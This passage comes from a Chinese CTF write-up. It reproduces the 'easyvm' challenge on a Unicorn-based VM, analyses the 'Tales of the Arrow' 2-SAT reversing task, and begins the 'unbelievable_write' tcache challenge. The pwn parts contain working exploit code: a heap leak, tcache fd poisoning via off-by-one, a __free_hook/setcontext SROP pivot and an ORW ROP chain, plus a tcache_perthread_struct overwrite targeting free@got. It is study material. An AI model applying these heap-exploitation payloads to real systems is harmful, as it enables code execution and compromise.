
```python
#读入设备名
sc += sys\_read(0,get\_name(0),0x20)
#打开设备，让其从largebins中获取fd->malloc\_buf的内存
sc += sys\_open(get\_name(0),0xb0)
#将fd->malloc\_buf中残留的数据读出到缓冲区
sc += sys\_read(3,get\_name(1),0x100)
#将缓冲区的数据输出给用户
sc += sys\_write(1,get\_name(1),8)
```

尽管现在泄露了地址，但利用却有些困难。`Unicorn`是以外部链接库的方式被调用的，我们不清楚它在执行过程中调用了多少`malloc`和`free`（除非我们真的去阅读源代码了，但似乎不太现实），所以布置起来会有些麻烦。但还是有些特别的小技巧可用。

观察之前的堆状态我们可以知道，有个别几个`Bin`像是不被库调用的，比如`size=0x60/0x80/0xc0`等，这些大小的`chunk`在`Tcache bin`中不存在，保守估计，我们能够找到一个完全由我们自己控制的大小块，这样就不需要担心因为调用库而被干扰了。

在上面泄露地址时：

```python
sc += sys\_open(get\_name(0),0xb0)
```

调用本行时，会申请`0xc0`大小的`chunk`，该`chunk`就很有可能不会被影响到。

接下来的思路是：

> 首先关闭`inode 3`，将`0xc0`的`chunk`释放到`tcache bin`，然后通过`off-by-one`溢出到该`chunk`的上方，然后`write`该`chunk`去向下覆盖其`fd`指针，这样就能在之后开辟`chunk`到该`fd`。

> 我们可以让它是`__free_hook`，那么就能写成`one_gadget`或其他各种各样了（不过本题开启了沙箱，所以`one_gadget`不行，还是得老老实实`orw`拿出`flag`）。

剩下的`payload`就不言而喻了，直接给出`Nu1L`师傅们的`exp`吧：（自己加了点注释）

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
def read(fd,addr,size):
sc = '''
xor eax,eax;
push {};
pop rdi;
mov rsi,{};
push {};
pop rdx;
syscall;
'''.format(fd,addr,size)
return sc
def write(fd,addr,size):
sc = '''
push 1;
pop rax;
push {};
pop rdi;
mov rsi,{};
push {};
pop rdx;
syscall;
'''.format(fd,addr,size)
return sc
def close(fd):
sc = '''
push 3;
pop rax;
push {};
pop rdi;
syscall;
'''.format(fd)
return sc
def insert(name_addr,size):
sc = '''
push 2;
pop rax;
mov rdi,{};
push {};
pop rsi;
syscall;
'''.format(name_addr,size)
return sc
def get_name(idx):
return 0x7FFFFFFEF000+0x20*idx#a chunk size 0x20
def dbg(addr):
gdb.attach(p,'b $rebase({})\n'.format(addr))
p = process("./easyvm",env={'LD_PRELOAD':'./libunicorn.so.1'})
elf=ELF("./easyvm")
libc=elf.libc
##---------PART 1---------##
sc = ''
sc += read(0,get_name(0),0x20)
sc += insert(get_name(0),0xb0)#3
sc += read(3,get_name(1),0x100)
sc += write(1,get_name(1),8)
sc += read(0,get_name(2),0x20)
sc += insert(get_name(2),0x100)#4
sc += read(0,get_name(3),0x20)
sc += insert(get_name(3),0xb0)#5
sc += read(0,get_name(4),0x300)
sc += close(5)
sc += close(3)
sc += write(4,get_name(4),0x38)
sc += insert(get_name(0),0xb0)
sc += insert(get_name(3),0xb8)
sc += write(5,get_name(4)+0x38,0xb8)
sc += 'mov rdx,0x100;'
sc = asm(sc)
p.sendlineafter('Send your code:',sc)
##---------PART 2---------##
name = '/dev/a'
p.send(name)#open inode 3
libc_base=u64(p.recvuntil("\x7f")[-6:] + '\x00\x00')-(0x7f42d70db1f0-0x7f42d6eef000)
print(hex(libc_base))
libc.address=libc_base
##---------PART 3---------##
p.send('/dev/'.ljust(0x18,'b'))#off-by-one#open inode 4
p.send('/dev/c')#open inode 5
#free_hook-->read-->setcontext
#setcontext->>read rop in bss||rsp to bss
payload=p64(libc.address+0x0000000000154930)+p64(libc.sym['__free_hook']-0x10)+p64(libc.sym['setcontext']+61)
sig = SigreturnFrame()
sig.rsp = libc.bss(0x500)
sig.rip = libc.sym['read']
sig.rdi = 0
sig.rsi = libc.bss(0x500)
sig.rdx = 0x300
sig = str(sig)
payload += sig[0x28:]
p.send('A'*0x28+p64(0x81)+p64(libc.sym['__free_hook'])+payload)
##---------PART 4---------##
#create orw rop
pop_rdi = 0x0000000000026b72+libc.address
pop_rsi = 0x0000000000027529+libc.address
pop_rdx_r12 = 0x000000000011c371 + libc.address
payload = p64(pop_rdi)+p64(libc.bss(0x600))+p64(pop_rsi)+p64(0)+p64(libc.sym['open'])
payload +=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(libc.bss(0x700))+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(libc.sym['read'])
payload +=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(libc.bss(0x700))+p64(pop_rdx_r12)+p64(0x100)+p64(0)+p64(libc.sym['write'])
payload = payload.ljust(0x100)+"./flag\x00"
p.send(payload)
p.interactive()
```

## 写在前面

---

本文为我个人在赛后对该比赛部分赛题所作的复现分析，可能会引用部分已公开的`EXP`，但文章的重点在于分析的过程而不是最终的结果，还请师傅们多多赐教，侵删致歉。

## RE

---

### Tales of the Arrow

在遇到这题以前甚至都没接触过`2-sat`问题，所以这次也对这个问题做个概述吧。

以下内容摘自`OI WIKI`：

> `2-SAT`，简单的说就是给出 `n`个集合，每个集合有两个元素，已知若干个`<a,b>`，表示 `a`与 `b`矛盾（其中 `a`与`b`属于不同的集合）。然后从每个集合选择一个元素，判断能否一共选`n`个两两不矛盾的元素。

而本题关键如下：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 | `def` `get_lit(i):` `return` `(i`+`1`) `*` (`2`*`int`(bits[i])`-`1`) `for` `t` `in` `range`(N): `i` `=` `random.randint(`0`,n`-`1`) `p` `=` `random.randint(`0`,`2`) `true_lit` `=` `get_lit(i)` `for` `j` `in` `range`(`3`): `if` `j` `==` `p:` `print`(true_lit) `else`: `tmp` `=` `random.randint(`0`,n`-`1`) `rand_true` `=` `get_lit(tmp)` `if` `random.randint(`0`,`3`)`==`0`: `print`(rand_true) `else`: `print`(`-`rand_true) |

每轮打印比特流中的随机三位的比特状态，但这个状态有可能会取反。且取反与否发生的概率是`0.5`。

一开始是`3-sat`问题，每轮必有一个数是真实状态，另外两个数则可真可假。但`3-sat`是`NP`完全问题，基本属于不可解。所以首先我们根据明文的特殊条件消除不确定性。

因为字符串必定是可打印的字符串，其由`ASCII`码组成，最高位必定为`0`。那么这一位的状态必定是负数，如果打印出该位的状态是正数，则表示它并非必然真值，那么该组数据中另外两个必有一个为真。如果将所有带有上述情况的组别取出，问题便被缩减到`2-sat`，即必有一真，另一者可真可假。

`2-sat`问题存在多项式解法（这是结论，笔者并没有证明过），即在数据量足够的情况下，该问题会有唯一解。本题一共给出了`5000`组数据，符合本条件。

而本题之后的解法也很朴素，在二选一的条件下，如果又出现了“必为负数”的位被以正数打印出来，那么最后一个数就必定真值了，将所有确定真值的位全都统计下来，就能还原完整的比特流。

参考`Nu1L`发布的`WP`自己改的：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 | `f` `=` `open`(`"output.txt"`) `n` `=` `int`(f.readline().rstrip(`'\n'`)) `N` `=` `int`(f.readline().rstrip(`'\n'`)) `x`=`[]` `for` `i` `in` `range`(`1`,`5000`): `x1`=`int`(f.readline()) `x2`=`int`(f.readline()) `x3`=`int`(f.readline()) `x.append([x1,x2,x3])` `true_numer`=`[]` `for` `i` `in` `range`(n//`8`): `true_numer.append(`-`8`*`i`-`1`) `flag`=`[]` `for` `i` `in` `range`(n): `flag.append(`0`) `for` `i` `in` `x:` `if`((( `-`i[`0`]` in `true_numer)` `+` (`-`i[`1`]` in `true_numer)` `+` (`-`i[`2`]` in `true_numer))`==`2`): `count`+=`1` `for` `j` `in` `range`(`3`): `if`((i[j]` not `in `true_numer)`and`(`-`i[j]`not` in `true_numer)): `true_numer`+=`[i[j]]` `for` `i` `in` `true_numer:` `if`(i<`0`): `flag[`abs`(i)`-`1]`=`0` `else`: `flag[i`-`1]`=`1` `flag_text`=`""` `for` `i` `in` `flag:` `flag_text`+=`str`(i) `print`(bytes.fromhex(`hex`(`int`(flag_text,`2`))[ `2` :])) `f.close()` |

## PWN

---

### unbelievable_write

任意地址`free`，没有泄露，没有`PIE`，本该是道简单题，结果做了一整天......看完官方`WP`之后发现自己还是想的太少了，不过我自己的方法姑且也打通了，所以先从笔者的方法开始吧。

`libc`版本是`2.31`，已经有`tcache`了。因为此前我很少接触这个部分，所以这次记的详细一些（个人其实不太愿意在需要之前主动去掌握利用方式，这看着有些像是在“为了利用而利用”）。

程序逻辑这里不再复述，唯一值得注意的就是，它会很快就把本轮开辟的`chunk`释放掉，所以很难在`Bin`中布置`chunk`。

任意地址`free`允许我们直接把`tcache_perthread_struct`释放，其结构如下：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 9 10 11 | `typedef struct tcache_perthread_struct` `{` `uint16_t counts[TCACHE_MAX_BINS];`/`/``TCACHE_MAX_BINS`=`64` `tcache_entry` `*` `entries[TCACHE_MAX_BINS];` `} tcache_perthread_struct;` `typedef struct tcache_entry` `{` `struct tcache_entry` `*` `next`; `struct tcache_perthread_struct` `*` `key;` `} tcache_entry;` |

可知该结构体大小为`0x290`，且能够控制`Tcache bin`的各项数据，包括链表和计数。

所以我们首先把它释放掉，然后向其中填充数据：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 9 10 | `#首先我们先开辟一个chunk让它放到tcache bin里，事后备用` `payload1`=`'aaaaaaaa'` `create_chunk(`0x28`,payload1)` `#然后释放tcache_perthread_struct` `free_index(`-`0x290`)` `#接下来将tcache里的count全都置7，表示装满，以后的chunk就不会再放到这里了` `#同时在里面将几个next指向free_got和target_addr` `#这样我们之后就能向free_got和target写入数据了` `payload1`= `(p16(`7`)*`0x28`).ljust(`128`,b'\x00')`+`(p64(free_got)+p64(target_addr)+p64(`0`)+p64(`0`))` `create_chunk(`0x288`,payload1)` |

在写入数据之后，它会立刻把`tcache_perthread_struct`释放掉，不过现在会因为`Tcache Bin`已经满了，而被放到`Unsorted Bin`里。`Bin`结构如下：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 | `tcachebins` `0x20` `[64480]`: `0x404018` `(free@got.plt) —▸` `0x7f1f03f31850` `(free) ◂— endbr64` `0x30` `[1031]`: `0x404080` `(target) ◂—` `0xfedcba9876543210` `.......` `0x280` [`7`]: `0x0` `0x290` [`7`]: `0x0` `unsortedbin` `all:` `0x1866000` `—▸` `0x7f1f0407fbe0` `(main_arena+96) ◂—` `0x1866000` |
